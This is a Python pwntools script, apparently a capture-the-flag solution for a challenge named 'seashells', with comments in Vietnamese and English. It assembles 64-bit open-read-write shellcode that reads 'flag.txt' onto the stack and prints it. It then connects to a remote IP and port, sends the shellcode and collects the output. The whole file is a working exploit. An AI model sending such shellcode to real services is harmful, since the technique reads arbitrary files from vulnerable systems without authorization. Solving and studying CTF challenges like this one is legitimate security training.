from pwn import *

# Thiet lap kien truc de asm() biet tao shellcode 64-bit
context.arch = 'amd64'

# Ket noi den server
# p = process('./seashells') # De chay local
p = remote('43.205.113.100', 8798)

# --- Xay dung Shellcode ORW ---
# Viet shellcode bang assembly va pwntools se dich no.

shellcode = asm('''
    /* Step 1: Open the file "flag.txt" */
    /* syscall open("flag.txt", O_RDONLY, 0) */
    
    /* Prepare arguments for the open syscall */
    /* Syscall number for open is 2 */
    mov rax, 2
    
    /* Arg 1 (rdi): pointer to the string "flag.txt" */
    /* We will place the string at the end and get its address */
    lea rdi, [rip+flag_path] 
    
    /* Arg 2 (rsi): flags. O_RDONLY is 0 */
    xor rsi, rsi
    
    /* Arg 3 (rdx): mode. Also 0 */
    xor rdx, rdx
    
    /* Execute syscall */
    syscall 
    /* After the call, the file descriptor (fd) is in rax */
    
    
    /* Step 2: Read from the file into a buffer */
    /* syscall read(fd, buffer, count) */
    
    /* Move the fd from rax to rdi for the first argument of read */
    mov rdi, rax
    
    /* Prepare arguments for the read syscall */
    /* Syscall number for read is 0 */
    mov rax, 0
    
    /* Arg 2 (rsi): buffer to store the flag. */
    /* We can use the current stack space as a buffer. */
    mov rsi, rsp
    
    /* Arg 3 (rdx): number of bytes to read */
    mov rdx, 0x100  /* Read 256 bytes, more than enough for a flag */
    
    /* Execute syscall */
    syscall
    /* After the call, the number of bytes read is in rax */

    
    /* Step 3: Write the flag to stdout */
    /* syscall write(stdout, buffer, count) */
    
    /* Move the number of bytes read (from rax) into rdx */
    mov rdx, rax
    
    /* Prepare arguments for the write syscall */
    /* Syscall number for write is 1 */
    mov rax, 1
    
    /* Arg 1 (rdi): fd for stdout is 1 */
    mov rdi, 1
    
    /* Arg 2 (rsi): buffer containing the flag (still at stack rsp) */
    mov rsi, rsp
    
    /* Arg 3 (rdx): number of bytes to write (already in rdx) */
    
    /* Execute syscall */
    syscall

/* Label for the "flag.txt" string */
flag_path:
    .string "flag.txt"
''')

# Gui shellcode cua chung ta
log.info(f"Sending shellcode ({len(shellcode)} bytes)")
p.sendline(shellcode)

# Nhan lai flag va in ra
log.success("Flag: " + p.recvall().decode())